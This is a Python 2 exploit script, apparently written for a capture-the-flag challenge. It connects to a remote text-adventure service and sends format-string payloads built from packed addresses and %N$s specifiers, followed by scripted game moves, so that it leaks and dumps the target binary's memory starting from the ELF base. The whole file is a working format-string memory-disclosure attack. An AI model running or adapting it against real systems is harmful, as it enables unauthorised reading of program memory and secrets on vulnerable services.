#!/usr/bin/env python
#-*- coding:utf-8 -*-

import re
import os
import sys
import time
import random
import socket
import struct

ADDRESS = ("a9.amalgamated.biz", 60123)
DIV = "<|"
N = 20  # addresses at one request
NULL_PTR = 0x08048008  # in ELF header
FAIL_LIMIT = 10

def main():
    if len(sys.argv) > 1:
        addr = int(sys.argv[1], 16)
    else:
        addr = 0x08048000

    if len(sys.argv) > 2:
        end_addr = int(sys.argv[2], 16)
    else:
        end_addr = addr + 0x1000

    dump = open("dump/" + hex(addr).strip("L")[2:], "w")
    while addr < end_addr:
        fmt = "AAAABBBB"
        
        for offset in xrange(N):
            packed = struct.pack("<I", addr + offset)
            if "\x00" in packed or "\n" in packed:  # can't get that byte
                fmt += struct.pack("<I", NULL_PTR)
            else:
                fmt += struct.pack("<I", addr + offset)

        formats = []
        for offset in xrange(N):
            formats.append("%" + str(11 + offset) + "$s")
        
        fmt += "START//"
        fmt += DIV.join(formats)
        fmt += "//END"

        print hex(addr),
        
        res = do_fmt(fmt)
        end_pos = res.find("//END")
        
        failed_tries = 0
        while True:
            res = do_fmt(fmt)
            res0 = res
            start_pos = res.rfind("START//")
            end_pos = res.find("//END", start_pos)

            if start_pos != -1 and end_pos != -1:
                res = res[start_pos+7:end_pos]
                if res.count(DIV) == N - 1:
                    break

            failed_tries += 1
            if failed_tries >= FAIL_LIMIT:
                res = DIV * (N - 1)
                break

            sys.stdout.write(" F")
            sys.stdout.flush()

        parts = res.split(DIV)
        assert(len(parts) == N)
        print repr(parts[0])

        offset = 0
        while offset < N:
            dump.write(parts[offset] + "\x00")
            dump.flush()
            addr += len(parts[offset]) + 1
            offset += len(parts[offset]) + 1

    return


def do_fmt(fmt):
    f = sock()
    f.send(fmt + "\n")
    #cmds = open("history.txt").readlines()[:118]
    #f.send("".join(cmds))
    # Shorter way - faster dump
    f.send("\n" + "w\n"*6 + "n\n"*2 + "e\n" + \
           "n\n"*5 + "w\n" + "take\n" + "e\nw\ne\n" + "s\n"*3 + \
           "e\n"*3 + "take\n" + "w\ne\nw\n" + "n\n"*2 + "e\n" + \
           "take\n" + "w\n" + "n\n"*3 + "w\n"*5 + "s\n"*2 + \
           "n\ns\n"*3 + "take\n")
    time.sleep(1)
    res = f.recv(4096 * 4096)
    return res


def sock():
    f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    f.connect(ADDRESS)
    return f


if __name__ == "__main__":
    main()
